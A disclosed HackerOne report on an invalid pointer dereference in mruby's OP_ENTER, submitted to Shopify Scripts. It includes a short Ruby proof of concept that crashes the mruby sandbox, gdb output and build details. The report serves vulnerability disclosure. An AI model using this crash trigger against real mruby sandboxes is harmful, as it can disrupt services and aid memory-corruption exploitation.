# Invalid pointer dereference in OP_ENTER

## Report Details
- **Report ID**: 218570
- **URL**: https://hackerone.com/reports/218570
- **State**: Closed
- **Severity**: low
- **Submitted**: 2017-04-04T17:02:26.975Z
- **Disclosed**: 2017-04-15T14:45:20.919Z

## Reporter
- **Username**: dgaletic
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
PoC
===
The following demonstrates a mruby/sandbox crash:

    def method_missing
    end    
    __send__ :f,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
   
Debug info
========== 

The crash happens due to an invalid pointer dereference in vm:c:1573:

    1571│       if (argc < 0) {
    1572│         struct RArray *ary = mrb_ary_ptr(regs[1]);
    1573├>        argv = ary->ptr;
    
    (gdb) p ary->ptr
    Cannot access memory at address 0x4000002cb


Test platform
=============
* Linux Mint 17.3 (Cinnamon 64-bit), built with gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3

mruby SHA: bdeb803f04b6bd919202b078a52df7abb0af73ee
mruby-engine SHA: 09be20e67888b20bebf9b0588bc3cbec7f55325f

Thank you,
Dinko Galetic
Denis Kasak

## Attachments
- poc
